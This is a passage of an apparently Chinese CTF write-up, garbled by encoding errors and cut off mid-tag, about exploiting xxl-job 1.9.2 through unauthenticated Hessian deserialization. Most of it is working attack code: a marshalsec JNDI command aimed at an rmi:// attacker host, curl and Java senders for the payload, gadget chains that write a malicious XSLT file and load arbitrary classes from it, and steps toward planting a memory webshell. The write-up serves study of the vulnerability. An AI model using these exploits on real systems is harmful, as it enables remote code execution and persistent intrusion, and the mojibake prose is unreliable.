class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.setName(<span class="hljs-string">&quot;Hessianå¼‚å¸¸toStringæˆåŠŸæo(=â€¢ã‚§â€¢=)m&quot;</span>);<br><br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(person);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//å…ˆå°†ç¬¬ä¸€ä¸ªå­—èŠ‚å¤åˆ¶ä¸º67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//ç„¶åå°†dataå¤åˆ¶åˆ°åé¢</span><br>        Hessian2_Deserial(poc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="https://cdn.clown2024.cn/image-20241126234432399.png" alt="image-20241126234432399"></p><h1 id="å¼€å§‹å¤ç°"><a href="#å¼€å§‹å¤ç°" class="headerlink" title="å¼€å§‹å¤ç°"></a>å¼€å§‹å¤ç°</h1><p>é¢˜ç›®å°±æ˜¯ä¸€ä¸ªxxl-jobçš„1.9.2çš„ç‰ˆæœ¬ï¼Œç‰ˆæœ¬æŒºä½çš„ï¼Œä¸€ä¸ªxxl-jobçš„æ€»ç»“ï¼Œå¤§éƒ¨åˆ†wpéƒ½æ˜¯çœ‹è¿™ä¸ªçš„ï¼š<a href="https://xz.aliyun.com/t/13899">https://xz.aliyun.com/t/13899</a></p><p>æ€»ç»“å°±æ˜¯xxl-jobä¸€èˆ¬æœ‰ä¸¤ä¸ªæ‰“æ³•ï¼Œä¸€ä¸ªæ˜¯æ‰“apiæœªæˆæƒï¼Œä¸€ä¸ªæ˜¯æ‰“executoræœªæˆæƒï¼Œè¯¥é¢˜æ‰“çš„å°±æ˜¯apiæœªæˆæƒè®¿é—®</p><h2 id="apiæœªæˆæƒæ‰“æ³•"><a href="#apiæœªæˆæƒæ‰“æ³•" class="headerlink" title="apiæœªæˆæƒæ‰“æ³•"></a>apiæœªæˆæƒæ‰“æ³•</h2><p>apiæœªæˆæƒï¼Œæ˜¯é’ˆå¯¹adminç»„ä»¶çš„ï¼Œè®¿é—®apiçš„æ—¶å€™ä¼šè¿”å›è¿™æ ·çš„å†…å®¹ï¼Œè¯æ˜è¿™æ˜¯å­˜åœ¨apiæœªæˆæƒ</p><p><img src="https://cdn.clown2024.cn/image-20241127000028369.png" alt="image-20241127000028369"></p><p>å¯ä»¥å»çœ‹çœ‹xxl-job-adminçš„æºç ä¸‹çš„apiè·¯ç”±éƒ½æ˜¯å¹²ä»€ä¹ˆçš„</p><p><img src="https://cdn.clown2024.cn/image-20241127000743175.png" alt="image-20241127000743175"></p><p>å¯ä»¥çœ‹åˆ°ä»–ä¼šè°ƒç”¨doInvokeæ–¹æ³•ï¼Œç„¶åç›´æ¥å°†bodyå…¨éƒ¨éƒ½ååºåˆ—åŒ–äº†</p><h3 id="æ‰“jndiæ³¨å…¥"><a href="#æ‰“jndiæ³¨å…¥" class="headerlink" title="æ‰“jndiæ³¨å…¥"></a>æ‰“jndiæ³¨å…¥</h3><p>ç„¶åå°±å¯ä»¥ç›´æ¥åˆ©ç”¨jndiï¼Œç”¨marshalsecç”Ÿæˆexpå»æ‰“</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">java -<span class="hljs-built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian2 SpringAbstractBeanFactoryPointcutAdvisor rmi://x.x.x.x:1099/aaa &gt; test.ser<br></code></pre></td></tr></table></figure><p>ç”¨çš„æ˜¯SpringAbstractBeanFactoryPointcutAdvisorè¿™æ¡é“¾å­</p><p>ç„¶ååˆ©ç”¨curlå»å‘åŒ…å³å¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">curl -XPOST -H <span class="hljs-string">&quot;Content-Type: x-application/hessian&quot;</span> --data-binary @test.ser http://127.0.0.1:8080/api<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ç§æ‰“æ³•éœ€è¦ç¯å¢ƒå‡ºç½‘ï¼Œè¿™é‡Œé¢˜ç›®æ˜¯ä¸å‡ºç½‘çš„ï¼Œæ‰€ä»¥éœ€è¦æ¢ä¸€ç§æ–¹å¼å»æ‰“å†…å­˜é©¬</p><h3 id="xsltæ‰“å†…å­˜é©¬"><a href="#xsltæ‰“å†…å­˜é©¬" class="headerlink" title="xsltæ‰“å†…å­˜é©¬"></a>xsltæ‰“å†…å­˜é©¬</h3><p>XSLTï¼ˆeXtensible Stylesheet Language Transformationsï¼Œå¯æ‰©å±•æ ·å¼è¡¨è¯­è¨€è½¬æ¢ï¼‰æ˜¯ä¸€ç§ç”¨äºè½¬æ¢XMLæ–‡æ¡£çš„ç¼–ç¨‹è¯­è¨€ã€‚XSLTå®šä¹‰äº†å¦‚ä½•å°†ä¸€ä¸ªXMLæ–‡æ¡£è½¬æ¢æˆå¦ä¸€ç§æ ¼å¼ï¼Œæ¯”å¦‚HTMLã€æ–‡æœ¬æˆ–è€…å¦ä¸€ä¸ªXMLæ–‡æ¡£ã€‚</p><p>è¿™éƒ¨åˆ†çš„åˆ©ç”¨åœ¨Nookipopå¸ˆå‚…çš„æ–‡ç« ä¸­æœ‰è¯´ï¼Œé‡Œé¢ä¸€äº›Hessiançš„é“¾å­æ²¡è§è¿‡ï¼Œè¿˜ä¸´æ—¶å»è¡¥äº†ä¸€ä¸‹</p><p>å› ä¸ºä¸å‡ºç½‘å°±éœ€è¦æ‰“å†…å­˜é©¬ï¼Œæˆ‘ä»¬è¿™é‡Œéœ€è¦æ‰“ä¸¤æ¬¡payloadï¼Œç¬¬ä¸€æ¬¡å†™å…¥xsltæ–‡ä»¶ï¼Œç¬¬äºŒæ¬¡è§£æxsltæ–‡ä»¶æ‰“å…¥å†…å­˜é©¬</p><p>å…ˆåˆ©ç”¨Hessiançš„PKCS9Attributesè¿™æ¡åŸç”Ÿé“¾å­å†™ä¸€ä¸ªxsltæ–‡ä»¶èƒ½å¤Ÿæ‰§è¡Œä»»æ„ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9å¯ä»¥æ¢æˆMimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> SerializeUtils.createWithoutConstructor(PKCS9Attributes.class);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;</span>, <span class="hljs-string">&quot;_main&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;-XT&quot;</span>, <span class="hljs-string">&quot;-XSL&quot;</span>, <span class="hljs-string">&quot;E:\\payload.xslt&quot;</span>&#125;&#125;));<br>        SerializeUtils.setFieldValue(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;poc.ser&quot;</span>);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(fileOut);<br>        fileOut.write(<span class="hljs-number">67</span>);<br>        out.getSerializerFactory().setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        out.writeObject(pkcs9Attributes);<br>        out.close();<br>        fileOut.close();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ€åè°ƒç”¨çš„é™æ€æ–¹æ³•æ˜¯Process#_mainæ–¹æ³•ï¼Œè¯¥æ–¹æ³•èƒ½å¤Ÿè§£æxsltæ–‡ä»¶</p><p>èƒ½å¤Ÿæ‰§è¡Œä»»æ„ä»£ç çš„æ¶æ„xsltæ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:b64</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ob</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Thread&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ru</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils&quot;</span></span><br><span class="hljs-tag">&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bs&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;b64:decodeBuffer(b64:new(),&#x27;base64&#x27;)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;cl&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;th:getContextClassLoader(th:currentThread())&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;rce&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;ru:defineClass(&#x27;classname&#x27;,$bs,$cl)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;$rce&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªç”¨æ¥å†™å…¥çš„é™æ€æ–¹æ³•ï¼Œé€‰ç”¨JavaUtilsçš„writeBytesTofilename</p><p><img src="https://cdn.clown2024.cn/image-20241127211222432.png" alt="image-20241127211222432"></p><p>é‚£å°±å¯ä»¥å¾—åˆ°å¦ä¸€ä¸ªpayload</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.javasec.pocs.hessian;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.javasec.utils.SerializeUtils;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attribute;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attributes;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HessianProxyLVFileWrite</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9å¯ä»¥æ¢æˆMimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> SerializeUtils.createWithoutConstructor(PKCS9Attributes.class);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//PKCS9Attribute.EMAIL_ADDRESS_OID æ˜¯å›ºå®šçš„ï¼Œè°ƒè¯•æµç¨‹å¯ä»¥çœ‹åˆ°é€»è¾‘</span><br>        <span class="hljs-comment">//å»ä¿®æ”¹éœ€è¦è¯»å–çš„æ–‡ä»¶ï¼Œå’Œå†™å…¥çš„æ–‡ä»¶åï¼Œå®ä¾‹ä¸­æ˜¯è¯»å–1.txtå†™å…¥pwned.txt</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>, <span class="hljs-string">&quot;writeBytesToFilename&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>,SerializeUtils.getFileBytes(<span class="hljs-string">&quot;E:\\payload.xslt&quot;</span>)&#125;));<br>        SerializeUtils.setFieldValue(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;poc.ser&quot;</span>);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(fileOut);<br>        fileOut.write(<span class="hljs-number">67</span>);<br>        out.getSerializerFactory().setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        out.writeObject(pkcs9Attributes);<br>        out.close();<br>        fileOut.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åè¿™é‡Œå†™ä¸€ä¸ªexpèƒ½å¤Ÿåºåˆ—åŒ–payloadå¹¶å‘é€postè¯·æ±‚çš„</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attribute;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attributes;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLConnection;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DasCTFEasyJob</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] Hessian2_Serial(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(baos);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(o);<br>        hessian2Output.flushBuffer();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">Hessian2_Deserial</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bais);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hessian2Input.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> o.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(o, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9å¯ä»¥æ¢æˆMimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attributes</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attribute</span>[]&#123;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//å»ä¿®æ”¹è¿™é‡Œå†™å…¥çš„æ–‡ä»¶åï¼Œä»¥åŠæ–‡ä»¶å†…å®¹</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>, <span class="hljs-string">&quot;writeBytesToFilename&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>, Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;payload.xslt&quot;</span>))&#125;));<br>        setField(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(pkcs9Attributes);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//å…ˆå°†ç¬¬ä¸€ä¸ªå­—èŠ‚å¤åˆ¶ä¸º67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//ç„¶åå°†dataå¤åˆ¶åˆ°åé¢</span><br><span class="hljs-comment">//        Hessian2_Deserial(poc);</span><br>        <span class="hljs-comment">//å‘é€postè¯·æ±‚ï¼Œå› ä¸ºHessianè¦å‘é€åŸç”Ÿçš„åºåˆ—åŒ–æ•°æ®</span><br>        <span class="hljs-comment">//åˆ›å»ºurlå¯¹è±¡</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:8080/api&quot;</span>);<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();<br>        <span class="hljs-comment">// è®¾ç½®è¯·æ±‚æ–¹æ³•ä¸º POST</span><br>        connection.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);<br>        <span class="hljs-comment">// è®¾ç½®è¯·æ±‚å¤´</span><br>        connection.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/octet-stream&quot;</span>);<br>        <span class="hljs-comment">// å…è®¸è¾“å‡º</span><br>        connection.setDoOutput(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//è®¾ç½®è¯·æ±‚ä½“</span><br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> connection.getOutputStream();<br>        outputStream.write(poc);<br>        <span class="hljs-comment">// è·å–å“åº”ç </span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> connection.getResponseCode();<br>        System.out.println(<span class="hljs-string">&quot;Response Code: &quot;</span> + responseCode);<br>        <span class="hljs-comment">// å…³é—­è¿æ¥</span><br>        connection.disconnect();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241127214635292.png" alt="image-20241127214635292"></p><blockquote><p>æ¬¸æˆ‘æœäº†æ‰“äº†å‡ æ¬¡æ²¡ååº”ï¼Œçœ‹äº†ä¸€ä¸‹å®¹å™¨æ—¥å¿—ï¼Œè¯´java.lang.ClassNotFoundException: sun.swing.SwingLazyValueï¼Œæ€ªäº†ï¼Œæˆ‘çœ‹äº†ä¸€ä¸‹adminç»„ä»¶çš„javaç‰ˆæœ¬</p><p>æˆ‘å»æ€ä¹ˆæ˜¯jdk21çš„ç‰ˆæœ¬çš„ğŸ˜“ï¼Œè¿™Tomcaté•œåƒç›´æ¥ç»™æˆ‘æ‹‰äº†ä¸€ä¸ª21çš„jdkï¼Œé‚£å°±æ”¹ä¸€ä¸‹adminçš„dockerfileï¼Œæ”¹æˆæ‰‹åŠ¨è£…tomcatå’Œjdkäº†</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># ä½¿ç”¨å®˜æ–¹Javaé•œåƒä½œä¸ºåŸºç¡€é•œåƒ</span><br><span class="hljs-keyword">FROM</span> dockerpull.org/openjdk:<span class="hljs-number">8</span>-jdk<br><br><span class="hljs-comment"># è®¾ç½®ç¯å¢ƒå˜é‡</span><br><span class="hljs-keyword">ENV</span> TOMCAT_WEBAPPS /usr/local/tomcat/webapps<br><span class="hljs-keyword">ENV</span> TIME_ZONE Asia/Shanghai<br><br><span class="hljs-comment"># å®‰è£…Tomcat</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> wget https://downloads.apache.org/tomcat/tomcat-9/v9.0.97/bin/apache-tomcat-9.0.97.tar.gz -O /tmp/tomcat.tar.gz \</span><br><span class="language-bash">    &amp;&amp; tar -xzf /tmp/tomcat.tar.gz -C /usr/local \</span><br><span class="language-bash">    &amp;&amp; <span class="hljs-built_in">rm</span> /tmp/tomcat.tar.gz \</span><br><span class="language-bash">    &amp;&amp; <span class="hljs-built_in">ln</span> -s /usr/local/apache-tomcat-9.0.97 /usr/local/tomcat</span><br><br><span class="hljs-comment"># æ¸…ç†é»˜è®¤çš„Tomcatåº”ç”¨</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/* <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/docs <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/examples <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/host-manager <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/manager</span><br><br><span class="hljs-comment"># è®¾ç½®æ—¶åŒº</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">ln</span> -snf /usr/share/zoneinfo/<span class="hljs-variable">$TIME_ZONE</span> /etc/localtime &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$TIME_ZONE</span> &gt; /etc/timezone</span><br><br><span class="hljs-comment"># æ·»åŠ ä½ çš„åº”ç”¨åˆ°Tomcatçš„webappsç›®å½•</span><br><span class="hljs-keyword">ADD</span><span class="language-bash"> ./xxl-job-admin-1.9.2 <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/</span><br><br><span class="hljs-comment"># æ¸…ç†ä¸´æ—¶æ–‡ä»¶</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -rf /tmp/*</span><br><br><span class="hljs-comment"># æš´éœ²Tomcatçš„ç«¯å£</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span><br><br><span class="hljs-comment"># å¯åŠ¨Tomcat</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> /usr/local/tomcat/bin/startup.sh &amp;&amp; <span class="hljs-built_in">tail</span> -F /usr/local/tomcat/logs/catalina.out</span><br></code></pre></td></tr></table></figure></blockquote><p>ç°åœ¨å†æ‰“ä¸€é</p><p><img src="https://cdn.clown2024.cn/image-20241127221633717.png" alt="image-20241127221633717"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸæ‰“è¿›å»äº†ï¼Œè¯æ˜expæ˜¯æ²¡é—®é¢˜çš„ï¼Œç°åœ¨å°±è¯¥è€ƒè™‘æ‰“ä»€ä¹ˆå†…å­˜é©¬äº†</p><blockquote><p>ç„¶åè¿™é‡Œæ‰“ç€æ‰“ç€çªç„¶å‘ç°äº†å¥‡æ€ªçš„é—®é¢˜ï¼Œæˆ‘ç°åœ¨æ‰“çš„æ˜¯apiçš„æœªæˆæƒï¼Œè€Œä¸”åˆæ˜¯åœ¨tomcatèµ·çš„æœåŠ¡ï¼Œæ€ä¹ˆwpæ‰“çš„æ˜¯jettyå†…å­˜é©¬å‘¢</p><p>åæ¥çœ‹äº†ä¸€ä¸‹é¢˜ç›®åªç»™äº†executorçš„ç«¯å£ï¼Œè€Œè¯¥ç‰ˆæœ¬çš„executorä¹Ÿæ˜¯å­˜åœ¨æœªæˆæƒæ‰“hessianååºåˆ—åŒ–çš„ï¼Œå…·ä½“çš„å¯ä»¥çœ‹ä¸€ä¸‹æ–‡ç« ï¼Œæ‰€ä»¥æˆ‘æ‰“åŠå¤©æ‰“é”™ç«¯å£äº†ğŸ˜¡ï¼Œé‚£ä¹Ÿå…ˆå¤ç°æ‰“ä¸€ä¸‹apiå§ï¼Œç­‰ä¼šå†æ‰“é¢˜ç›®çš„executoræœªæˆæƒ</p></blockquote><p>è¿™é‡Œç”¨ä¸€æ¬¾javaå†…å­˜é©¬ç”Ÿæˆå·¥å…·ï¼š<a href="https://github.com/pen4uin/java-memshell-generator-release">https://github.com/pen4uin/java-memshell-generator-release</a></p><p><img src="https://cdn.clown2024.cn/image-20241128173522354.png" alt="image-20241128173522354"></p><p>ç”Ÿæˆå¯¹åº”çš„å†°èå†…å­˜é©¬</p><p>ç„¶åxsltæ–‡ä»¶æ”¹æˆè¿™æ ·</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span 